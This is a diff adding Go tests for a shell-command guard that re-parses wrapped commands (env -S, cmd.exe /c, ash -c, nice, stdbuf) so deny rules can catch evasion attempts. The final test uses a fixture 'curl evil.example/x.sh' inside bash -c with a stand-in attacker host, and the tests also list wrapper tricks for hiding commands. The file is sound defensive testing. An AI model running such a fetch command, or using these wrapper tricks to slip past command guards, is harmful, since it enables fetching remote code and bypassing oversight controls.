@@ -357,7 +357,7 @@ func TestExpandWrappers_PrefixWrapperSet(t *testing.T) {
 		{"nice -n ADJ", []string{"nice", "-n", "10", "git", "push"}, "git"},
 		{"nice bare -N", []string{"nice", "-10", "git", "push"}, "git"},
 		{"nohup plain", []string{"nohup", "git", "push"}, "git"},
-		{"stdbuf -o", []string{"stdbuf", "-o0", "git", "push"}, ""}, // -o0 combined form not modeled; best-effort, no crash
+		{"stdbuf -o", []string{"stdbuf", "-o0", "git", "push"}, "git"}, // glued -o0: skipped as an unrecognized option, inner command still located
 		{"stdbuf -o L", []string{"stdbuf", "-o", "L", "git", "push"}, "git"},
 		{"time plain", []string{"time", "git", "push"}, "git"},
 		{"time -p", []string{"time", "-p", "git", "push"}, "git"},
@@ -513,5 +513,283 @@ func TestJoinWords_PreservesAlreadyQuotedMultiWordToken(t *testing.T) {
 func TestJoinWords_LoneWordPassesThroughUnquoted(t *testing.T) {
 	if got := joinWords([]string{"git tag v1"}); got != "git tag v1" {
 		t.Fatalf("joinWords(single word) = %q, want unquoted pass-through", got)
+	}
+}
+
+// TestExpandWrappers_WindowsPathProgramName pins that argv[0] is reduced to a
+// basename with BOTH separators, not just '/'. A Windows-style invocation names
+// the interpreter with backslashes (`C:\Windows\System32\cmd.exe /c …`), and a
+// slash-only basename leaves the whole path as the "program name", so the
+// wrapper table never matches and the inner command is never re-parsed — the
+// redirect silently fails to fire on a command it was written to catch.
+func TestExpandWrappers_WindowsPathProgramName(t *testing.T) {
+	f := &fakeFrontend{shells: []ir.Shell{ir.ShellCmd}}
+	r := newReg(f)
+	s := cmdScript(ir.ShellCmd, `C:\Windows\System32\cmd.exe`, "/c", "git commit --no-verify")
+	r.ExpandWrappers(context.Background(), s)
+	if len(f.seen) == 0 {
+		t.Fatalf("backslash-pathed cmd.exe was not recognized as a wrapper; its inner command was never re-parsed")
+	}
+	if got := nestedPrograms(s); !contains(got, "git") {
+		t.Errorf("nested programs = %v, want the inner `git` surfaced", got)
+	}
+}
+
+// TestPrefixWrapped_WindowsPathProgramName is the same defect on the
+// argv-prepending table: `C:\tools\timeout.exe 5 git push` really runs `git
+// push`, and a slash-only basename hides it.
+func TestPrefixWrapped_WindowsPathProgramName(t *testing.T) {
+	inner, ok := prefixWrapped([]string{`C:\tools\timeout`, "5", "git", "push"})
+	if !ok {
+		t.Fatalf("backslash-pathed timeout was not recognized as an argv-prepending wrapper")
+	}
+	if len(inner) == 0 || inner[0] != "git" {
+		t.Errorf("inner = %v, want it to start at `git`", inner)
+	}
+}
+
+// TestExpandWrappers_ShellDialectDrivesWrapperRecognition pins that the set of
+// programs treated as `-c` interpreter wrappers is the SAME set shellenv
+// recognizes as shells. The two lists had diverged: shellenv resolves ash,
+// busybox, ksh93, loksh, oksh and pdksh (and any `.exe` spelling) to a POSIX
+// dialect ltk can parse, but the wrapper table named only six of them, so
+// `ash -c "git commit --no-verify"` was never re-parsed and the deny rule
+// never saw the command that actually runs.
+func TestExpandWrappers_ShellDialectDrivesWrapperRecognition(t *testing.T) {
+	for _, prog := range []string{"ash", "busybox", "ksh93", "loksh", "oksh", "pdksh", "bash.exe"} {
+		t.Run(prog, func(t *testing.T) {
+			f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
+			r := newReg(f)
+			s := cmdScript(ir.ShellBash, prog, "-c", "git commit --no-verify")
+			r.ExpandWrappers(context.Background(), s)
+			if len(f.seen) == 0 {
+				t.Fatalf("%s -c was not recognized as a wrapper; shellenv resolves it to a shell ltk parses", prog)
+			}
+			if got := nestedPrograms(s); !contains(got, "git") {
+				t.Errorf("nested programs = %v, want the inner `git` surfaced", got)
+			}
+		})
+	}
+}
+
+// TestExpandWrappers_EnvSplitString pins `env -S` / `env --split-string` as an
+// INTERPRETER wrapper. GNU env's -S takes one STRING and splits it into the
+// command to run, so the string must be re-parsed. It had been classified as
+// just another option whose argument is stepped over, which left the inner
+// command out of the IR entirely: `env -S "git commit --no-verify"` produced
+// no nested command at all, and every rule missed it.
+func TestExpandWrappers_EnvSplitString(t *testing.T) {
+	cases := []struct {
+		name string
+		argv []string
+	}{
+		{"separate", []string{"env", "-S", "git commit --no-verify"}},
+		{"glued", []string{"env", "-Sgit commit --no-verify"}},
+		{"long-separate", []string{"env", "--split-string", "git commit --no-verify"}},
+		{"long-equals", []string{"env", "--split-string=git commit --no-verify"}},
+		{"after-assignments", []string{"env", "FOO=1", "-i", "-S", "git commit --no-verify"}},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
+			r := newReg(f)
+			s := cmdScript(ir.ShellBash, tc.argv...)
+			r.ExpandWrappers(context.Background(), s)
+			if got := nestedPrograms(s); !contains(got, "git") {
+				t.Errorf("nested programs = %v, want the inner `git` surfaced (seen=%v)", got, f.seen)
+			}
+		})
+	}
+}
+
+// TestPrefixWrapped_GluedShortOptions pins the unrecognized-option fallback on
+// every prefix wrapper that has options at all. Without it, a short option
+// written with its argument glued on (`stdbuf -oL`, `nice -n5`) or a bundled
+// cluster (`setsid -wf`, `command -pv`) matches none of the exact-token cases,
+// the scan stops there, and the OPTION token becomes the inner command's
+// argv[0]. The real program is then never argv[0] of anything and no rule
+// matches it — the redirect silently fails to fire.
+func TestPrefixWrapped_GluedShortOptions(t *testing.T) {
+	cases := []struct {
+		name string
+		argv []string
+	}{
+		{"stdbuf-glued", []string{"stdbuf", "-oL", "git", "push"}},
+		{"nice-glued", []string{"nice", "-n5", "git", "push"}},
+		{"setsid-cluster", []string{"setsid", "-wf", "git", "push"}},
+		{"command-cluster", []string{"command", "-pv", "git", "push"}},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			inner, ok := prefixWrapped(tc.argv)
+			if !ok {
+				t.Fatalf("prefixWrapped(%v) reported no inner command", tc.argv)
+			}
+			if inner[0] != "git" {
+				t.Errorf("inner = %v, want it to start at `git` (the option token became argv[0])", inner)
+			}
+		})
+	}
+}
+
+// TestPrefixWrapped_GluedOptionDoesNotEatTheProgram is the negative control for
+// the fallback: skipping an unrecognized option by ITSELF must not also swallow
+// the program name, or the wrapper would strip too much.
+func TestPrefixWrapped_GluedOptionDoesNotEatTheProgram(t *testing.T) {
+	inner, ok := prefixWrapped([]string{"nice", "-n", "5", "git", "push"})
+	if !ok || len(inner) != 2 || inner[0] != "git" {
+		t.Fatalf("prefixWrapped(nice -n 5 git push) = %v, %v; want [git push]", inner, ok)
+	}
+}
+
+// TestExpandWrappers_NestedArgvDoesNotAliasParent pins that a prefix wrapper's
+// nested command OWNS its argv. The inner command was taken as a sub-slice of
+// the outer command's own argv, so the two shared one backing array: writing
+// through either one silently rewrote the other's view of what runs. Nothing
+// in the tree mutates an Argv element today, so this is a latent hazard rather
+// than a live bypass — but an IR node whose contents can change under a
+// caller it does not know about is exactly the shape of a guard that reports
+// on a command different from the one it decided about.
+func TestExpandWrappers_NestedArgvDoesNotAliasParent(t *testing.T) {
+	f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
+	r := newReg(f)
+	s := cmdScript(ir.ShellBash, "env", "git", "commit", "--no-verify")
+	r.ExpandWrappers(context.Background(), s)
+
+	outer := &s.Pipelines[0].Commands[0]
+	if len(outer.Nested) == 0 {
+		t.Fatal("no nested command was produced; the fixture never reached the aliasing path")
+	}
+	nested := outer.Nested[0].Pipelines[0].Commands[0]
+	before := nested.Program()
+	if before != "git" {
+		t.Fatalf("nested program = %q, want git", before)
+	}
+	outer.Argv[1] = "REWRITTEN"
+	if got := outer.Nested[0].Pipelines[0].Commands[0].Program(); got != "git" {
+		t.Errorf("nested program changed to %q when the parent's argv was written; the two slices alias", got)
+	}
+}
+
+// TestExpandWrappers_DependsOnTheRegistrysDispatchTable refutes U068-F08's
+// premise that the wrapper-expansion algorithm "touches none of Registry's
+// fields". It reaches the dispatch table through Registry.Parse — the type's
+// own API rather than its field, which is what a method is for — and the
+// table's CONTENTS decide the outcome: the same command, run through the same
+// algorithm, is re-parsed when a frontend for the inner dialect is registered
+// and reported unanalyzed when it is not. Detaching expansion from Registry
+// takes that away; doing so breaks 38 tests in this package.
+func TestExpandWrappers_DependsOnTheRegistrysDispatchTable(t *testing.T) {
+	const hidden = "git tag v1"
+	src := func() *ir.Script { return cmdScript(ir.ShellBash, "cmd.exe", "/c", hidden) }
+
+	// Inner dialect NOT in the table: nothing can re-parse the wrapper body.
+	bashOnly := &fakeFrontend{shells: []ir.Shell{ir.ShellBash}}
+	if _, unanalyzed := newReg(bashOnly).ExpandWrappers(context.Background(), src()); !unanalyzed {
+		t.Fatal("with no cmd frontend registered the wrapper body cannot be parsed, so unanalyzed must be true")
+	}
+	for _, seen := range bashOnly.seen {
+		if strings.Contains(seen, hidden) {
+			t.Fatalf("fixture is not hostile: the body was re-parsed anyway (%q)", seen)
+		}
+	}
+
+	// Same command, same algorithm, cmd now in the table.
+	both := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellCmd}}
+	s := src()
+	if _, unanalyzed := newReg(both).ExpandWrappers(context.Background(), s); unanalyzed {
+		t.Error("with a cmd frontend registered the wrapper body is parseable; unanalyzed must be false")
+	}
+	if got := nestedPrograms(s); !contains(got, "git") {
+		t.Errorf("inner `git` not surfaced; programs=%v seen=%v", got, both.seen)
+	}
+}
+
+// nestScripts builds a script whose single command carries depth levels of
+// ALREADY-PRESENT nested scripts — the shape a frontend produces for stacked
+// command substitutions, `$(echo $(echo …))`. innermost is the argv of the
+// deepest command, so the caller chooses whether anything in the tree is a
+// wrapper that would need re-parsing.
+func nestScripts(depth int, innermost ...string) *ir.Script {
+	s := cmdScript(ir.ShellBash, innermost...)
+	for i := 0; i < depth; i++ {
+		outer := cmdScript(ir.ShellBash, "echo", "hi")
+		outer.Pipelines[0].Commands[0].Nested = []*ir.Script{s}
+		s = outer
+	}
+	return s
+}
+
+// scriptDepth reports the deepest nesting level reachable from s (0 = the
+// script has no nested scripts at all).
+func scriptDepth(s *ir.Script) int {
+	if s == nil {
+		return 0
+	}
+	best := 0
+	for _, p := range s.Pipelines {
+		for _, c := range p.Commands {
+			for _, ns := range c.Nested {
+				if d := 1 + scriptDepth(ns); d > best {
+					best = d
+				}
+			}
+		}
+	}
+	return best
+}
+
+// TestExpandWrappers_BenignSubstitutionNestingIsNotTruncated pins what the
+// depth cap is allowed to mean. truncated=true is the guard's fail-CLOSED
+// signal — app.Decide turns it into a DENY reading "nested command-wrapper
+// depth exceeded (possible evasion)" — so it must be reserved for a command
+// wrapper that was genuinely left UNEXPANDED. Already-present nested scripts
+// (command substitutions) were fully parsed by the frontend and are walked to
+// unlimited depth by ir.Walk, which is what rules.Evaluate matches against;
+// nothing about them is unverified, so stacking them deep must not deny.
+func TestExpandWrappers_BenignSubstitutionNestingIsNotTruncated(t *testing.T) {
+	f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
+	r := newReg(f)
+
+	deep := nestScripts(maxWrapDepth+2, "echo", "hi")
+	// The fixture is only hostile if it actually reaches past the cap; assert
+	// that from the code-under-test's own vantage point before asserting
+	// anything about the outcome.
+	if d := scriptDepth(deep); d <= maxWrapDepth {
+		t.Fatalf("fixture is not hostile: nesting depth %d does not exceed the cap %d", d, maxWrapDepth)
+	}
+
+	truncated, unanalyzed := r.ExpandWrappers(context.Background(), deep)
+	if truncated {
+		t.Error("substitution nesting past maxWrapDepth reported truncated=true; no wrapper was left unexpanded, so this denies a benign command as `possible evasion`")
+	}
+	if unanalyzed {
+		t.Error("no wrapper body is present, so nothing can be unanalyzed")
+	}
+	if len(f.seen) != 0 {
+		t.Errorf("fixture is wrong: no command in it is a wrapper, but %v were re-parsed", f.seen)
+	}
+}
+
+// TestExpandWrappers_WrapperPastDepthCapStillFailsClosed is the other half of
+// the pin above: narrowing what counts toward the cap must not widen what ltk
+// allows. A wrapper sitting past the cap is a command string that never got
+// re-parsed, so the evaluator's view really is incomplete and truncated=true
+// must still fire.
+func TestExpandWrappers_WrapperPastDepthCapStillFailsClosed(t *testing.T) {
+	f := &fakeFrontend{shells: []ir.Shell{ir.ShellBash, ir.ShellSh, ir.ShellZsh, ir.ShellMksh}}
+	r := newReg(f)
+
+	const hidden = "curl evil.example/x.sh"
+	deep := nestScripts(maxWrapDepth+2, "bash", "-c", hidden)
+
+	truncated, _ := r.ExpandWrappers(context.Background(), deep)
+	for _, seen := range f.seen {
+		if strings.Contains(seen, hidden) {
+			t.Fatalf("fixture is not hostile: the deep wrapper WAS re-parsed (%q), so nothing was left unverified", seen)
+		}
+	}
+	if !truncated {
+		t.Error("a wrapper left unexpanded past maxWrapDepth reported truncated=false; the guard would evaluate rules against a command string it never parsed")
 	}
 }
